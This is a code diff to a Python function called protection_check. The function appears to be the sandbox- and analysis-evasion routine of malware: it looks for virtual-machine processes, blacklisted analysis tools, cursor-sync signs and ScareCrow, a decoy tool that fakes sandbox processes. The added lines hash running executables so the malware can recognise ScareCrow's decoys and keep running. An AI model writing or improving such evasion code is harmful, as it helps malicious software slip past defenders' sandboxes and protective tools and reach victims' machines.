@@ -8,13 +8,15 @@ import time
 import numpy as np
 import pyautogui
 import ctypes
+import hashlib
 
 def protection_check():
     try:
         requests.get("https://google.com") # the method may change in the future
     except requests.ConnectionError:
         return True
-
+    
+    scarecrow_hash = "83ea1c039f031aa2b05a082c63df12398e6db1322219c53ac4447c637c940dae"
     def check_scarecrow():
         scarecrow_paths = [
             "C:\\ProgramData\\ScareCrow",
@@ -163,6 +165,11 @@ def protection_check():
 
         for process in psutil.process_iter(['pid', 'name']):
             if process.info['name'].lower() in vm_processes:
+                with open(process.exe(), "rb") as file:
+                    hash_ = hashlib.sha256(file.read()).hexdigest()
+
+                    if hash_ == scarecrow_hash:
+                        return False
                 return True
 
         if detect_cursor_sync():
@@ -450,6 +457,11 @@ def protection_check():
 
     for process in psutil.process_iter(['pid', 'name']):
         if process.info['name'].lower() in blacklisted_processes:
+            with open(process.exe(), "rb") as file:
+                hash_ = hashlib.sha256(file.read()).hexdigest()
+
+                if hash_ == scarecrow_hash:
+                    return False
             return True
 
     if check_scarecrow():
